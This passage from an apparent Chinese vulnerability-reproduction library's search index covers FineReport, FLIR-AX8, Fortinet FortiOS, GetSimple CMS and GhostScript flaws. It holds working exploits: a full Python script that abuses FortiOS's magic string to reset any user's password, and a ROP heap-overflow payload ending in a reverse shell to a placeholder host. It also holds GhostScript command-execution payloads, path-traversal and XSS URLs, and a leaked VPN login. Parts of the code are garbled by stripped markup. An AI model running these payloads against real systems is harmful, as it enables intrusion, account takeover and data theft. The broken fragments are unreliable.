&& paramString.split(\\\"\\Q..\\E\\\").length > 3))); } 初步看来应该是为了防止ssrf？但对这个任意文件读取漏洞而言依旧没有任何影响。 最后使用了readResource函数来去读文件流，将其显示浏览器当中，这里其实在初步审的时候其实是有一点问题的，那就是文件的默认路径，这里必须要跟进这个FRContext类中去看看如何初始化文件默认路径，由于跟的过程比较复杂，最终发现默认是访问resources目录下的文件3.png这里面较为关键的是privilege.xml，因为其中存储的就是超级管理员的账号和加密密码，在官网补丁中推荐的修补建议是加大密码强度，但实际情况是这里面的解密函数已经内置在jar包里，并且使用了硬编码的方式，所以如果能够拿到加密字符串，等同于拿到了管理员账号和密码4.png至此利用任意文件读取漏洞可以拿到管理员的账号和密码，从而进入到后台。 poc http://www.0-sec.org:8080/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..¤tUserName=admin¤tUserId=1&isWebReport=true 5.png 参考链接 https://www.freesion.com/article/1056237571/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:06 "},"Web安全/FineReport/FineReport 后台getshell/FineReport 后台getshell.html":{"url":"Web安全/FineReport/FineReport 后台getshell/FineReport 后台getshell.html","title":"FineReport 后台getshell","keywords":"","body":"FineReport 后台getshell 一、漏洞简介 二、漏洞影响 FineReport v8.0 三、复现过程 123漏洞代码位于fr-platform-8.0.jar包中的com.fr.fs.plugin.op.web.action.InstallFromDiskAction2.png这对应的其实是后台的插件上传功能，但是这里面比较另类的这里的插件包名固定为\"temp.zip\"，其中上传目录为\\\"tmp\\\"目录，但是我们需要将zip包解压缩获取到我们所上传的shell文件，所以查看全局代码的解压缩功能，找到一个能够配合上的函数，代码位于com.fr.fs.plugin.op.web.action.UpdateFromDiskAction3.png这里在插件管理模块需要更新本地插件，由于会将更新插件和原始插件进行比较，所以当上传一个新的插件时会触发installPluginFromUnzipperDir函数4.png这个函数里面会将zip包中的文件给提取到当前目录中，从而将我们上传的jsp shell传到目标服务器中，但是由于所有的环境变量都是在WEB-INF目录下，所以tmp目录下的文件从外部访问是访问不到的，所以下面还需要找一个文件重定向的漏洞将jsp文件给移出来 文件重定向漏洞 漏洞代码位于com.fr.fs.web.service.ServerConfigManualBackupAction中5.png这里代码比较简单点，传入\"edit_backup\"，进入到条件语句当中，然后传入原始文件名和新的文件名，但是这里需要注意的这里将默认目录名设置为\"frbak\"目录，因此在进行目录穿越的时候需要在本地进行调试。 最后利用文件重命名漏洞将shell文件移动网站根目录，成功GETSHELL~ 参考链接 http://foreversong.cn/archives/1378 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:06 "},"Web安全/FLIR-AX8/FLIR-AX8 download.php 任意文件下载/FLIR-AX8 download.php 任意文件下载.html":{"url":"Web安全/FLIR-AX8/FLIR-AX8 download.php 任意文件下载/FLIR-AX8 download.php 任意文件下载.html","title":"FLIR-AX8 download.php 任意文件下载","keywords":"","body":"FLIR-AX8 download.php 任意文件下载 漏洞描述 FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞 漏洞影响 FLIR-AX8 FOFA app=\"FLIR-FLIR-AX8\" 漏洞复现 出现漏洞的文件为 download.php \"application/octet-stream\", \"zip\" => \"application/zip\", \"mp3\" => \"audio/mpeg\", \"mpg\" => \"video/mpeg\", \"avi\" => \"video/x-msvideo\", ); $ctype = isset($content_types[$file_ext]) ? $content_types[$file_ext] : $ctype_default; header(\"Content-Type: \" . $ctype); //check if http_range is sent by browser (or download manager) if(isset($_SERVER['HTTP_RANGE'])) { list($size_unit, $range_orig) = explode('=', $_SERVER['HTTP_RANGE'], 2); if ($size_unit == 'bytes') { //multiple ranges could be specified at the same time, but for simplicity only serve the first range //http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt list($range, $extra_ranges) = explode(',', $range_orig, 2); } else { $range = ''; header('HTTP/1.1 416 Requested Range Not Satisfiable'); exit; } } else { $range = ''; } //figure out download piece from range (if set) list($seek_start, $seek_end) = explode('-', $range, 2); ob_clean(); //set start and end based on range (if set), else set defaults //also check for invalid ranges. $seek_end = (empty($seek_end)) ? ($file_size - 1) : min(abs(intval($seek_end)),($file_size - 1)); $seek_start = (empty($seek_start) || $seek_end 0 || $seek_end 简单审计可以发现 file参数 为可控参数且没有过滤参数，导致可以下载任意文件 /download.php?file=/etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:07 "},"Web安全/Fortinet FortiOS/（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞/（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞.html":{"url":"Web安全/Fortinet FortiOS/（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞/（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞.html","title":"（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞","keywords":"","body":"（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞 一、漏洞简介 Fortinet FortiOS路径遍历漏洞（CNNVD-201905-1026、CVE-2018-13379）漏洞源于该系统未能正确地过滤资源或文件路径中的特殊元素，导致攻击者可以利用该漏洞访问受限目录以外的位置。Fortinet FortiOS 5.6.3版本至5.6.7版本、6.0.0版本至6.0.4版本中的SSL VPN 受此漏洞影响。 二、漏洞影响 Fortinet FortiOS 5.6.3版本至5.6.7版本、 Fortinet FortiOS 6.0.0版本至6.0.4版本 中的SSL VPN 受此漏洞影响。 三、复现过程 POC：http://www.0-sec.org:4443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession FortinetFortiOS路径遍历漏洞/media/rId24.png) 利用泄露的账户herschel/vvpn123成功登陆。 FortinetFortiOS路径遍历漏洞/media/rId25.png) FortinetFortiOS路径遍历漏洞/media/rId26.png) 检测工具 https://github.com/ianxtianxt/CVE-2018-13379 参考链接 https://blog.csdn.net/limb0/article/details/102890683 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:08 "},"Web安全/Fortinet FortiOS/（CVE-2018-13380）Fortinet FortiOS xss漏洞/（CVE-2018-13380）Fortinet FortiOS xss漏洞.html":{"url":"Web安全/Fortinet FortiOS/（CVE-2018-13380）Fortinet FortiOS xss漏洞/（CVE-2018-13380）Fortinet FortiOS xss漏洞.html","title":"（CVE-2018-13380）Fortinet FortiOS xss漏洞","keywords":"","body":"（CVE-2018-13380）Fortinet FortiOS xss漏洞 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中的SSL VPN Web门户存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8 三、复现过程 http://www.0-sec.org/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E http://www.0-sec.org/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29 http://www.0-sec.org/message?title=x&msg=%26%23; Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:09 "},"Web安全/Fortinet FortiOS/（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞/（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞.html":{"url":"Web安全/Fortinet FortiOS/（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞/（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞.html","title":"（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞","keywords":"","body":"（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。 二、漏洞影响 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8 三、复现过程 在编码HTML实体代码时，有两个阶段。服务器首先计算编码字符串所需的缓冲区长度，然后将其编码到缓冲区。在计算阶段，例如，字符编码为 ，占用5个字节。如果遇到任何以&#开头的字符，例如，服务器会认为这个token已经被编码了，并直接计算其长度。像这样： c = token[idx]; if (c == '(' || c == ')' || c == '#' || c == '') cnt += 5; else if(c == '&' && html[idx+1] == '#') cnt += len(strchr(html[idx], ';')-idx); 然而，长度计算和编码过程之间将存在不一致，编码部分无法处理这种情况。 switch (c) { case '': // ... default: buf[counter] = c; break; counter++; } 如果我们输入恶意字符串如&#，仍将编码成，所以编码结果应该是&#！这比预期的6个字节长得多，从而导致堆溢出。PoC： import requests data = { 'title': 'x', 'msg': '&#' + 'Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:09 "},"Web安全/Fortinet FortiOS/（CVE-2018-13382）Fortinet FortiOS magic后门/（CVE-2018-13382）Fortinet FortiOS magic后门.html":{"url":"Web安全/Fortinet FortiOS/（CVE-2018-13382）Fortinet FortiOS magic后门/（CVE-2018-13382）Fortinet FortiOS magic后门.html","title":"（CVE-2018-13382）Fortinet FortiOS magic后门","keywords":"","body":"（CVE-2018-13382）Fortinet FortiOS magic后门 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本 、5.6.0版本至5.6.8版本和5.4.1版本至5.4.10版本中的SSL VPN Web门户存在授权问题漏洞。该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。 二、漏洞影响 Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9 Fortinet Fortios 5.4.11 三、复现过程 在登录页面中，我们找到了一个的特殊参数magic。一旦这个参数为某个特殊字符串，我们就可以修改任何用户的密码。 FortinetFortiOSmagic后门/media/rId24.png) 根据我们的调查，仍有大量的Fortigate SSL VPN缺少补丁。因此，考虑到其严重性，我们不会透露magic字符串。但是，CodeWhite的研究人员已经复现了这个漏洞。毫无疑问，其他攻击者很快就会利用此漏洞！请尽快更新您的Fortigate！ Critical vulns in #FortiOS reversed & exploited by our colleagues \\@niph_ and \\@ramoliks - patch your #FortiOS asap and see the #bh2019 talk of \\@orange_8361 and \\@mehqq_ for details (tnx guys for the teaser that got us started) pic.twitter.com/TLLEbXKnJ4 --- Code White GmbH (\\@codewhitesec) 2019年7月2日 poc https://github.com/ianxtianxt/CVE-2018-13382 $ python CVE-2018-13382.py -h Usage: CVE-2018-13382.py [options] Options: -h, --help show this help message and exit -i IP e.g. 127.0.0.1:10443 -u USERNAME -p PASSWORD import requests, binascii, optparse, sys from urlparse import urlparse from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) requests.packages.urllib3.disable_warnings() import multiprocessing import colored from user_agent import generate_user_agent, generate_navigator bold=True userAgent=generate_user_agent() username=\"\" newpassword=\"\" ip=\"\" def setColor(message, bold=False, color=None, onColor=None): from termcolor import colored, cprint retVal = colored(message, color=color, on_color=onColor, attrs=(\"bold\",)) return retVal def checkIP(ip): try: url = \"https://\"+ip+\"/remote/login?lang=en\" headers = {\"User-Agent\": userAgent, \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"} r=requests.get(url, headers=headers, verify=False) if r.status_code==200 and \"Please Login\" in r.text: return True else: return False except requests.exceptions.ConnectionError as e: print e return False def changePassword(ip,username,newpassword): url = \"https://\"+ip+\"/remote/logincheck\" headers = {\"User-Agent\": userAgent, \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://\"+ip+\"/remote/login?lang=en\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-store, no-cache, must-revalidate\", \"If-Modified-Since\": \"Sat, 1 Jan 2000 00:00:00 GMT\", \"Content-Type\": \"text/plain;charset=UTF-8\", \"Connection\": \"close\"} data = {\"ajax\": \"1\", \"username\": username, \"realm\": '', \"credential\": newpassword, \"magic\": \"4tinet2095866\", \"reqid\": \"0\", \"credential2\": newpassword} r=requests.post(url, headers=headers, data=data, verify=False) if r.status_code==200 and 'redir=/remote/hostcheck_install' in r.text: return True else: return False def testLogin(ip,username,newpassword): url = \"https://\"+ip+\"/remote/logincheck\" headers = {\"User-Agent\": userAgent, \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://\"+ip+\"/remote/login?lang=en\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-store, no-cache, must-revalidate\", \"If-Modified-Since\": \"Sat, 1 Jan 2000 00:00:00 GMT\", \"Content-Type\": \"text/plain;charset=UTF-8\", \"Connection\": \"close\"} data = {\"ajax\": \"1\", \"username\": username, \"realm\": '', \"credential\": newpassword} r=requests.post(url, headers=headers, data=data, verify=False) if r.status_code==200 and\"redir=/remote/hostcheck_install\" in r.text: return True else: return False parser = optparse.OptionParser() parser.add_option('-i', action=\"store\", dest=\"ip\", help=\"e.g. 127.0.0.1:10443\") parser.add_option('-u', action=\"store\", dest=\"username\") parser.add_option('-p', action=\"store\", dest=\"password\") options, remainder = parser.parse_args() if not options.username or not options.password or not options.ip: print \"[!] Please provide the ip (-i), username (-u) and password (-p)\" sys.exit() if options.username: username=options.username if options.password: newpassword=options.password if options.ip: ip=options.ip tmpStatus=checkIP(ip) if tmpStatus==True: print \"[*] Checking if target is a Fortigate device \"+setColor(\" [OK]\", bold, color=\"green\") if changePassword(ip,username,newpassword)==True: print \"[*] Using the magic keyword to change password for: [\"+username+\"]\"+setColor(\" [OK]\", bold, color=\"green\") if testLogin(ip,username,newpassword)==True: print \"[*] Testing new credentials [\"+username+\"|\"+newpassword+\"] \"+setColor(\" [OK]\", bold, color=\"green\") print \"************** Enjoy your new credentials **************\\n\" else: print \"[*] Testing new credentials [\"+username+\"|\"+newpassword+\"] \"+setColor(\" [NOK]\", bold, color=\"red\") else: print \"[*] Using the magic keyword to change password for: [\"+username+\"]\"+setColor(\" [NOK]\", bold, color=\"red\") else: print \"[*] Checking if target is a Fortigate device \"+setColor(\" [NOK]\", bold, color=\"red\") Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:10 "},"Web安全/Fortinet FortiOS/（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞/（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞.html":{"url":"Web安全/Fortinet FortiOS/（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞/（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞.html","title":"（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞","keywords":"","body":"（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.2.0之前版本中存在堆缓冲区溢出漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。 二、漏洞影响 Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 三、复现过程 这是WebVPN功能的漏洞。在解析HTML中的JavaScript时，它会尝试使用以下代码将内容复制到缓冲区中： memcpy(buffer, js_buf, js_buf_len); 缓冲区大小固定为0x2000，但输入字符串是无限制的。因此，这里存在堆溢出。值得注意的是，此漏洞可以溢出Null字节，这在我们的利用中很有用。为触发此溢出，我们需要将exploit放到HTTP服务器上，然后以普通用户权限登录SSL VPN代理访问我们的exploit为普通用户。 这里我们用PHP编写的PoC放在HTTP服务器上: //请自行修改里面的ip以及所需要的执行的命令 > 32 & 0xffffffff; return pack(\"II\", $low, $high); } $junk = 0x4141414141414141; $nop_func = 0x32FC078; $gadget = p64($junk); $gadget .= p64($nop_func - 0x60); $gadget .= p64($junk); $gadget .= p64(0x110FA1A); // # start here # pop r13 ; pop r14 ; pop rbp ; ret ; $gadget .= p64($junk); $gadget .= p64($junk); $gadget .= p64(0x110fa15); // push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ; $gadget .= p64(0x1bed1f6); // pop rax ; ret ; $gadget .= p64(0x58); $gadget .= p64(0x04410f6); // add rdi, rax ; mov eax, dword [rdi] ; ret ; $gadget .= p64(0x1366639); // call system ; $gadget .= \"python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;\"; $p = str_repeat('AAAAAAAA', 1024+512-4); // offset $p .= $gadget; $p .= str_repeat('A', 0x1000 - strlen($gadget)); $p .= $gadget; ?> \">xxx 这个PoC可以分为三个部分。 1.虚假的SSL structure SSL structure和我们的缓冲区相靠，因此我们可以精确伪造。为了避免崩溃，我们将method设置为一个包含空函数指针的位置。此时的参数是 SSL structure本身s。但是，method前面只有8个字节，我们不能简单地调用system(\"/bin/sh\");，这对于我们的反向shell来说是不够的。不过由于那个巨大的二进制文件，我们很容易找到ROP小片段。我们发现一个有用的堆栈枢轴: push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ; 因此，我们将handshake_func设置为这个小片段，将rsp移动到SSL structure中，进行下一步的ROP攻击。 2.ROP链 这里的ROP链很简单。我们稍微向前移动rdi，以便有足够的空间执行反向shell命令。 3.溢出的字符串 最后，我们连接溢出填充并加以利用。一旦我们溢出了SSL structure，就会得到一个shell。 最终稳定利用还需要多次尝试，因为有时程序会提前崩溃。但无论如何，攻击还是奏效了，只需要1~2分钟，就可以获得一个反向shell。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:10 "},"Web安全/GetSimple CMS/（CVE-2019-11231）GetSimple CMS远程命令执行/（CVE-2019-11231）GetSimple CMS远程命令执行.html":{"url":"Web安全/GetSimple CMS/（CVE-2019-11231）GetSimple CMS远程命令执行/（CVE-2019-11231）GetSimple CMS远程命令执行.html","title":"（CVE-2019-11231）GetSimple CMS远程命令执行","keywords":"","body":"（CVE-2019-11231）GetSimple CMS 远程命令执行 一、漏洞简介 在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。 二、漏洞影响 GetSimple\\ 三、复现过程 漏洞分析 在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。 htaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。 启用.htaccess，需要在apache配置文件中，启用AllowOverride。 在笔者测试了两款环境，分别为配置了wamp的windows与ubuntu服务器，在这两个环境中，默认情况对htaccess文件的启用情况是不同的。 先来看安装有wamp的windows环境，打开apahce配置文件httpd.conf GetSimpleCMS远程命令执行/media/rId25.png) 可以看到，这里将位于conf/extra/httpd-vhosts.conf文件导入 跟进 httpd-vhosts.conf文件 GetSimpleCMS远程命令执行/media/rId26.png) 可以看到，在这里，默认情况下 AllowOverride 默认值是All 当AllowOverride指令设置为 All时，所有具有\".htaccess\"作用域的指令都允许出现在.htaccess文件中。 此时，目录中的.htaccess配置文件为启用状态 例如位于getsimplecms/data目录中的.htaccess配置文件 GetSimpleCMS远程命令执行/media/rId27.png) GetSimpleCMS远程命令执行/media/rId28.png) 当此.htaccess配置文件被加载时，是禁止该目录被web端访问的 GetSimpleCMS远程命令执行/media/rId29.png) 也就是说，通过该方法，通过web端访问data目录时，不会显示其中文件列表 与其中文件内容，是可以很好的保护存在于该目录下的文件，不被泄露 但是在笔者的ubuntu服务器，ubuntu apache2.conf中 GetSimpleCMS远程命令执行/media/rId30.png) AllowOverride 默认值是None，默认的情况下，不加载目录中的.htaccess 我们将上述的.htaccess文件放入ubuntu服务器的web目录中 GetSimpleCMS远程命令执行/media/rId31.png) 再通过浏览器访问这个路径 GetSimpleCMS远程命令执行/media/rId32.png) 如上图可见，.htaccess并没有生效，而路径中的文件，是可以被泄露的 回归到本次漏洞： 访问http://127.0.0.1/getsimplecms/data/users/admin.xml GetSimpleCMS远程命令执行/media/rId33.png) 在.htaccess没有生效的情况下，我们获取admin.xml中记录的用户相关信息，该cms并没有将用户信息写入数据库，而是全部存于该文件中 GetSimpleCMS远程命令执行/media/rId34.png) 访问http://127.0.0.1/getsimplecms/data/other/authorization.xml获取authorization.xml中记录的apikey 现在我们得到如下的信息：（用户名/加密后的密码/apikey） 该cms并没有将用户信息写入数据库，而是全部存于xml文件中 通过获取的信息，接下来进一步分析如何利用这些泄露的信息： Cookie算法分析： 分析下GetSimple中的cookie是如何生成的 位于\\GetSimpleCMS\\admin\\inc\\cookie_functions.php create_cookie方法 GetSimpleCMS远程命令执行/media/rId35.png) 计算cookie所需的$USR $SALT 对应如下： GetSimpleCMS\\data\\users\\admin.xml文件 GetSimpleCMS远程命令执行/media/rId36.png) GetSimpleCMS远程命令执行/media/rId37.png) getsimplecms\\data\\other\\authorization.xml GetSimpleCMS远程命令执行/media/rId38.png) GetSimpleCMS远程命令执行/media/rId39.png) 这些信息是可以直接读取出来的 getsimplecms 中Cookie的算法的实现如下: GetSimpleCMS远程命令执行/media/rId40.png) 算法相对简单，通过$SALT值与$USR进行拼接；$SALT值与$cookie_name拼接，最终通过sha1进行加密，算出对应的cookie键值对 通过泄露的文件与cookie算法，可以顺利计算出对应用户的cookie 现在，可以伪造任意成员的cookie了 以USR :admin举例说明： 最终拼接的cookie为： GS_ADMIN_USERNAME=admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c Password算法分析： 分析下Password的计算方式 GetSimpleCMS远程命令执行/media/rId41.png) Password的加密，是通过passhash()方法来实现的 GetSimpleCMS远程命令执行/media/rId42.png) GSLOGINSALT是用来保护的密码的额外的salt值，默认情况为空。 所以这里的密码计算就比较直接了，通过sha1方法对明文密码进行加密 sha1($p) 通过sha1 hash将明文密码加密为密文。 GetSimpleCMS远程命令执行/media/rId43.png) 也就是说，只要获取了加密后的password，有一定几率，可以破解为明文： GetSimpleCMS远程命令执行/media/rId44.png) 获取到管理员cookie/password后，使用管理员账号登陆后台 通过伪造cookie访问后台： 未登录时，访问后台地址 GetSimpleCMS远程命令执行/media/rId45.png) GetSimpleCMS远程命令执行/media/rId46.png) 此时需要填写正确的用户名密码才可以登陆后台 这里，通过改包的方式，将cookie修改为之前计算出的值 GetSimpleCMS远程命令执行/media/rId47.png) 此时，无需登陆，直接进入后台 GetSimpleCMS远程命令执行/media/rId48.png) 访问如下url http://127.0.0.1/getsimplecms/admin/theme-edit.php GetSimpleCMS远程命令执行/media/rId49.png) 在这里可以对模板文件进行编辑，在这里可以写入任意php代码，造成远程代码执行漏洞 例如： GetSimpleCMS远程命令执行/media/rId50.png) 访问如下地址： http://127.0.0.1/getsimplecms/theme/Innovation/template.php GetSimpleCMS远程命令执行/media/rId51.png) 插入的php代码被成功执行 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:12 "},"Web安全/GhostScript/（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞/（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞.html":{"url":"Web安全/GhostScript/（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞/（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞.html","title":"（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞","keywords":"","body":"（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞 一、漏洞简介 该漏洞源于在处理/invalidaccess异常时，程序没有正确的检测'restoration of privilege（权限恢复）'。攻击者可通过提交特制的PostScript利用该漏洞执行代码。 二、漏洞影响 Ghostscript 9.24之前版本 三、复现过程 上传poc.png，将执行命令id > /tmp/success && cat /tmp/success。此时进入容器docker-compose exec web bash，将可以看到/tmp/success已被创建： poc.png %!PS userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice putdeviceprops GhostScript沙箱绕过(命令执行)漏洞/media/rId24.png) 参考链接 https://vulhub.org/\\#/environments/ghostscript/CVE-2018-16509/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:16 "},"Web安全/GhostScript/（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞/（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞.html":{"url":"Web安全/GhostScript/（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞/（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞.html","title":"（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞","keywords":"","body":"（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞 一、漏洞简介 ./psi/zdevice2.c文件存在安全特征问题漏洞。该漏洞是源于网络系统或产品中缺少身份验证、访问控制、权限管理等安全措施。 二、漏洞影响 Ghostscript 9.26之前版本 三、复现过程 将POC作为图片上传，执行命令id > /tmp/success && cat /tmp/success： POST /index.php HTTP/1.1 Host: target Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO Content-Length: 279 ------WebKitFormBoundaryukZmnyhO Content-Disposition: form-data; name=\"file_upload\"; filename=\"1.jpg\" content-Type=\"image/png\" %!PS 0 1 300367 {} for {save restore} stopped {} if (%pipe%id > /tmp/success && cat /tmp/success) (w) file ------WebKitFormBoundaryukZmnyhO-- 命令已成功执行： GhostScript沙箱绕过(命令执行)漏洞/media/rId24.png) 参考链接 https://vulhub.org/\\#/environments/ghostscript/CVE-2018-19475/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:16 "},"Web安全/GhostScript/（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞/（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞.html":{"url":"Web安全/GhostScript/（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞/（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞.html","title":"（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞","keywords":"","body":"（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞 一、漏洞简介 Ghostscript 9.26版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。 二、漏洞影响 Ghostscript 9.26版本 三、复现过程 poc.png %!PS % extract .actual_pdfpaintproc operator from pdfdict /.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def /exploit { (Stage 11: Exploitation...)= /forceput exch def systemdict /SAFER false forceput userparams /LockFilePermissions false forceput systemdict /userparams get /PermitFileControl [(*)] forceput systemdict /userparams get /PermitFileWriting [(*)] forceput systemdict /userparams get /PermitFileReading [(*)] forceput % update save restore % All done. stop } def errordict /typecheck { /typecount typecount 1 add def (Stage 10: /typecheck #)=only typecount == % The first error will be the .knownget, which we handle and setup the % stack. The second error will be the ifelse (missing boolean), and then we % dump the operands. typecount 1 eq { null } if typecount 2 eq { pop 7 get exploit } if typecount 3 eq { (unexpected)= quit } if } put % The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some % executable arrays onto the operand stack that contain .forceput, but are not % marked as executeonly or pseudo-operators. % % The routine was attempting to pass them to ifelse, but we can cause that to % fail because when the routine was declared, it used `bind` but many of the % names it uses are not operators and so are just looked up in the dictstack. % % This means we can push a dict onto the dictstack and control how the routine % works. > begin > > { .actual_pdfpaintproc } stopped pop (Should now have complete control over ghostscript, attempting to read /etc/passwd...)= % Demonstrate reading a file we shouldnt have access to. (/etc/passwd) (r) file dup 64 string readline pop == closefile (Attempting to execute a shell command...)= flush % run command (%pipe%id > /tmp/success) (w) file closefile (All done.)= quit 上传这个poc文件，即可执行id > /tmp/success： GhostScript沙箱绕过(命令执行)漏洞/media/rId24.png) 参考链接 https://vulhub.org/\\#/environments/ghostscript/CVE-2019-6116/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:17 "},"Web安全/Git-LFS/Git-LFS 远程命令执行漏洞 CVE-2020-27955/Git-LFS 远程命令执行漏洞 CVE-2020-27955.html":{"url":"Web安全/Git-LFS/Git-LFS 远程命令执行漏洞 CVE-2020-27955/Git-LFS 远程命令执行漏洞 CVE-2020-27955.html","title":"Git-LFS 